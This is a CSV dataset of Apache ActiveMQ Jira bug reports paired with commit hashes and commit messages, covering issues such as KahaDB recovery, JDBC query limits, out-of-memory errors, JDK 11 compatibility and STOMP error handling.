bug id,bug key,bug description,commit hash,commit msg
13288498,AMQ-7429,"The upgrade to Shiro 1.5.x brings Spring 5.1.x but we still use Spring 4.2.x. It's not a problem but spring-expression comes from Shiro and so it's not aligned with other Spring artifacts version.

I'm fixing.",cb23db5c5deb33b2201ba5aa13847d470c2317de,[AMQ-7429] Align spring-expression version with other spring artifacts
13284062,AMQ-7400,<NA>,b7dca5e0738639f2bffe7f97b9c782372fc2188e,[AMQ-7400] Fix OSGi statement about sun.rmi
13283826,AMQ-7399,"To avoid potential security issue when using {{ObjectMessage}}, {{SERIALIZABLE_PACKAGE}} should be limited by default. Now, it contains {{java.lang, ...}}",8cdddde5b47f06d5bc9d1c27e25287bc050799c6,AMQ-7399 - Adding a unit test
13275090,AMQ-7368,"In Statements.java, we have the following query:
{code:java}
public String getFindNextMessagesStatement() {
    if (findNextMessagesStatement == null) {
        findNextMessagesStatement = ""SELECT ID, MSG FROM "" + getFullMessageTableName()
                                    + "" WHERE CONTAINER=? AND ID < ? AND ID > ? AND XID IS NULL ORDER BY ID"";
    }
    return findNextMessagesStatement;
} {code}
This statement is used in {{DefaultJDBCAdapter}} in the {{doRecoverNextMessages()}}.

In this method, we do:
{code:java}
s.setMaxRows(Math.min(maxReturned, maxRows)); {code}
{{setMaxRows}} is supposed to limit the number of rows. However, it doesn't seem to prevent the concrete SQL executed on the database side.

It means that we have a huge huge impact on performance (especially with lot of pending messages).



To avoid this performance issue, the findNextMessagesStatement select statement should use limit (with the same value of {{setMaxRows}}).

As it's more ""postgresql"" specific (any database supporting limit should do the same), we can update PostgreSQLJDBCAdapter to use limit.

It's not yet fully clear to me if the issue if about the PostgreSQL JDBC driver (bad ""translation"" of the {{setMaxRows()}}) or just the ActiveMQ select statement should use limit. ",61bf624c6dd5a999dc9dd1f900bffc6c4feb9fa1,"[AMQ-7368] Add limitQuery in HSQL, MySQL and PostgreSQL JDBC adapters"
13264420,AMQ-7327,"The {{ws}} transport connector uses the {{maxFrameSize}} to set binary and text message size limit.
However the {{http}} transport connector doesn't and the user needs a hack on {{jetty.xml}}.
The {{http}} transport connector should directly use the {{maxFrameSize}}.",50a94cbf12f6a4b9d623b07515b9fd86c53efb13,[AMQ-7327] Use maxFrameSize to limit HTTP content length
13236391,AMQ-7219,"Hi,

 

Sending non persistent messages on a Transacted session is causing activeMQ to keep and replay (on startup) unnecessary journal files. If all messages are in this situation activemq will replay the whole journal file even with a clean shutdown.

 The problem is because is if the transaction has no persistent operation, the metadata.lastUpdate is never updated.

[https://github.com/apache/activemq/blob/master/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/MessageDatabase.java#L1400]",bce979349ea9be499d1a686582e8638d369251d1,AMQ-7219 - ActiveMQ replays journal file on a clean/unclean shutdown with transacted session + Non persistent Messages
13233006,AMQ-7201,"SUBJ, when creating a broker instance with `activemq create` the generated admin script bin/<instancename> is missing shebang line.",b11b9aac7515ce897c216b472770bf3cf4734847,AMQ-7201 added shebang to generated broker admin script
13232308,AMQ-7196,"I had a broker with lots of scheduled messages and I noticed that during startup (clean or unclean) the broker was reading the whole index file and storing it os memory:

[https://github.com/apache/activemq/blob/master/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/scheduler/JobSchedulerImpl.java#L665]

In order to prevent the OOM, I changed this method to return a Iterator<JobLocation> instead of a List<JobLocation> avoiding load all this data into the heap.

 

I also noticed that during the startup we read the index at least 3 times:

 

[https://github.com/apache/activemq/blob/master/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/scheduler/JobSchedulerStoreImpl.java#L829]

[https://github.com/apache/activemq/blob/master/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/scheduler/JobSchedulerStoreImpl.java#L857]

and 

[https://github.com/apache/activemq/blob/master/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/scheduler/JobSchedulerStoreImpl.java#L940]

 

Probably we can optimize this but this should be another Jira (also maybe we dont need to call recover(tx) when its a clean shutdown)

[https://github.com/apache/activemq/blob/master/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/scheduler/JobSchedulerStoreImpl.java#L787]",dc35218a2d766a86a78376bfd4b51e7ae5bda935,AMQ-7196 - fix broken test; recovery not applicable to inmemory store
13231289,AMQ-7193,"occasional NPE on duplex network bridge start, dispatch during startup issue. NPE
{code:java}
2019-05-02 16:16:25,116 [0.1:53461@53456] - WARN DemandForwardingBridgeSupport - Network connection between vm://B1#10 and tcp:///127.0.0.1:53461@53456 shutdown due to a remote error: {}
java.lang.NullPointerException
 at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:815)
 at org.apache.activemq.network.DemandForwardingBridgeSupport$3.onCommand(DemandForwardingBridgeSupport.java:238)
 at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
 at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
 at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:125)
 at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:301)
 at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
 at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
 at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
 at java.lang.Thread.run(Thread.java:748)
 {code}",7404b43f2d9c5bbf4ab4ec89ae111d5bf1527d82,"AMQ-7193 - resolve intermittent NPE on duplex network connector start; wait for start completion before dispatching inbound messages, fix and test"
13220055,AMQ-7163,"Hi,

This is related to AMQ-7082.

If the broker had an unclean shutdown and the recovery thread didn't find any free pages (newFreePages is empty the recovery), the broker will have a second unclean shutdown - and this will happens to any future restart as long as the number of free pages is = 0 

 

See:

 

[https://github.com/apache/activemq/blob/9e6543551731ef0241967ca545c9a4956876cb86/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/disk/page/PageFile.java#L484]

 

[https://github.com/apache/activemq/blob/9e6543551731ef0241967ca545c9a4956876cb86/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/disk/page/PageFile.java#L584]

 

[https://github.com/apache/activemq/blob/9e6543551731ef0241967ca545c9a4956876cb86/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/disk/page/PageFile.java#L527]

 ",cd1d5eb785a759d285652551f1984ce9877a1192,"AMQ-7163 - If the broker had an unclean shutdown and number of free pages is Zero after the recovery, the next shutdown will also be 'unclean'"
13209200,AMQ-7135,"When removing (delete) a destination using the console an error is reported. It appears all the page files are batched into memory.  If you have a large set of page files and a relatively small heap, this will cause the system to run out of memory. 

This can be reproduced by doing the following:

env: heap size: 384MB

1. Create a “test” queue and send more than 2 millions of persistent messages with size of 100KB to the “test”queue (this take some times). 
2. Delete “test” queue by clicking “delete” button on ActiveMQ Console. 
3. Wait and broker will die eventually. 
4. Broker won’t reboot successfully

The observed error below can be seen in the logs. 

{{org.springframework.web.util.NestedServletException: Handler dispatch failed; nested exception is java.lang.OutOfMemoryError: GC overhead limit exceeded}}
{{ at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:982)[spring-webmvc-4.3.18.RELEASE.jar:4.3.18.RELEASE]}}",5c23dd53ad3d40e80273f48ab36afda00186736e,"AMQ7135 : do a purge before deleting the destination

(cherry picked from commit 9f513f88781667df1a2a4b0a85153059dc097295)"
13207174,AMQ-7125,"AMQ broker does not send the error frame back to the WebSocket client when an empty destination is sent with a stomp subscribe frame. Only the connection is terminated. 

As per stomp specification:

""If the server cannot successfully create the subscription, the server MUST send the client an ERROR frame and disconnect the client.""

[https://stomp.github.io/stomp-specification-1.1.html#SUBSCRIBE]

 ",b10458e2c69aa8743e6606948a13dcf27dca1ccc,AMQ-7125 Broker does not send error frame when an empty destination is sent with a stomp subscribe frame
13203030,AMQ-7121,"We are trying to run a broker in JDK 11 and run into the following exception:
{code:java}
2018-12-07 12:44:41,363 ERROR main o.a.a.u.IntrospectionSupport Could not set property soTimeout on ServerSocket[addr=/0:0:0:0:0:0:0:0,localport=9505]
java.lang.IllegalAccessException: class org.apache.activemq.util.IntrospectionSupport cannot access a member of class sun.nio.ch.ServerSocketAdaptor (in module java.base) with modifiers ""public""
at java.base/jdk.internal.reflect.Reflection.newIllegalAccessException(Reflection.java:361)
at java.base/java.lang.reflect.AccessibleObject.checkAccess(AccessibleObject.java:591)
at java.base/java.lang.reflect.Method.invoke(Method.java:558)
at org.apache.activemq.util.IntrospectionSupport.setProperty(IntrospectionSupport.java:184)
at org.apache.activemq.util.IntrospectionSupport.setProperties(IntrospectionSupport.java:155)
at org.apache.activemq.transport.tcp.TcpTransportServer.configureServerSocket(TcpTransportServer.java:187)
at org.apache.activemq.transport.tcp.TcpTransportServer.bind(TcpTransportServer.java:142)
at org.apache.activemq.transport.tcp.TcpTransportFactory.doBind(TcpTransportFactory.java:62)
at org.apache.activemq.transport.TransportFactorySupport.bind(TransportFactorySupport.java:40)
at org.apache.activemq.broker.TransportConnector.createTransportServer(TransportConnector.java:318)
at org.apache.activemq.broker.TransportConnector.getServer(TransportConnector.java:141){code}
Note that we also see
{code:java}
Could not set property reuseAddress ...{code}
These are caused by {{sun.nio.ch.ServerSocketAdaptor}} becoming a non-public class in JDK 11 (if not earlier).

It can be fixed simply by having {{IntrospectionSupport.setProperty}} call {{setter.setAccessible(true)}} before it invokes any methods on it.

Otherwise we find our local broker runs perfectly fine. ",88525ce650e0843b555b1ef45834435ef719d2f6,[AMQ-7121] Set setter accessible (for JDK 11)
13201770,AMQ-7118,"KahaDB store limit can be exceeded with durable subscribers.

AMQ with store limit set, we can observe that the usage continues to increase AFTER PFC is engaged. Given time, this growth stabilizes. The issue of having exceeded the store limit remains.

See below output from KahaDB dump in attachments:

This appears to be caused by checkpointAckMessageFileMap. The log files are not GC'd, and the KAHA_ACK_MESSAGE_FILE_MAP_COMMAND is replicated and the DB log files continue to expand - this can become exponential. Side effect of also not checking storage size in checkpoint update can cause the DB log files to exceed any set limits. The real critical part is the duplicated and leaking Kaha messages which appears to happen with durable subscribers.

 

 

 ",273afef47c9fef5258cc297ae7353b705db3efb6,"AMQ-7118 - Override hostname for naming to allow tests to apss on all
platforms"
13193696,AMQ-7085,"I have an application using ActiveMQ and have a situation where a producer is blocked with this log message due to the temp usage limit being hit:
{noformat}
[ActiveMQ Transport: tcp:///aaa.bbb.ccc.ddd:65119@64759] 82567721 INFO  org.apache.activemq.broker.region.Queue - Usage(Main:temp:queue://aaabbb:temp) percentUsage=99%, usage=61771109932, limit=61771104256, percentUsageMinDelta=1%;Parent:Usage(Main:temp) percentUsage=100%, usage=61771109932, limit=61771104256, percentUsageMinDelta=1%: Temp Store is Full (99% of 61771104256). Stopping producer (ID:aaaaa-3:1:1:1) to prevent flooding queue://aaabbb. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 8512s){noformat}
In the past I have been able to use JConsole and update the broker's TempLimit value to a higher value to allow things to continue.
 
However on this occasion, the messages above when output again show that the parent's temp limit has updated however the child's limit (the queue) is unchanged.  So it seems the broker's TempUsage does not know about the queue's TempUsage. 
 
In looking at the code.. it seems a child Usage class has to call start() in order for this parent -> children link to be established and for parent limit changes to be propagated down to children.  However the Queue start() method doesn't call systemUsage.getTempUsage().start() for some reason (or even just systemUsage.start()).
 
Is this a bug?
 
DestinationView sadly does not expose setTempLimit() either so this wasn't an option either.
 
From Queue:
{code:java}
    @Override
    public void start() throws Exception {
        if (started.compareAndSet(false, true)) {
            if (memoryUsage != null) {
                memoryUsage.start();
            }
            if (systemUsage.getStoreUsage() != null) {
                systemUsage.getStoreUsage().start();
            }
            systemUsage.getMemoryUsage().addUsageListener(this);
            messages.start();
            if (getExpireMessagesPeriod() > 0) {
                scheduler.executePeriodically(expireMessagesTask, getExpireMessagesPeriod());
            }
            doPageIn(false);
        }
    }{code}
   ",daea192eefe683a8cba63b5136dc8c2b39722cfe,"AMQ-7085 - Properly start TempUsage inside Queue start

This fix allows temp usage changes to the broker temp usage to propagate
properly to a Queue's temp usage settings

Patch applied with thanks to David Sitsky"
13189438,AMQ-7067,"KahaDB Recovery can experience a dangling transaction when prepare and commit occur on different data files.

Scenario:

A XA Transaction is started, message is prepared and sent into Broker.

We then send into broker enough messages to file page file (100 message with 512 * 1024 characters in message payload). This forces a new data file to be created.

Commit the XA transaction. Commit will land on the new data file.

Restart the Broker.

Upon restart a KahaDB recovery is executed.

The prepare in PageFile 1 is not matched to Commit on PageFile 2, as such, it will appear in recovered message state.

Looking deeper into this scenario, it appears that the commit message is GC'd, hence the prepare & commit can not be matched.

The MessageDatabase only checks the following for GC:

{color:#808080}// Don't GC files referenced by in-progress tx{color}{color:#cc7832}if {color}(inProgressTxRange[{color:#6897bb}0{color}] != {color:#cc7832}null{color}) {
 {color:#cc7832}for {color}({color:#cc7832}int {color}pendingTx=inProgressTxRange[{color:#6897bb}0{color}].getDataFileId(){color:#cc7832}; {color}pendingTx <= inProgressTxRange[{color:#6897bb}1{color}].getDataFileId(){color:#cc7832}; {color}pendingTx++) {
 gcCandidateSet.remove(pendingTx){color:#cc7832};{color} }
 }

We need to become aware of where the prepare & commits occur in pagefiles with respect to GCing files.",8e5d539665519629139633e324a672b0a415d4b2,AMQ-7067 - add missing license header
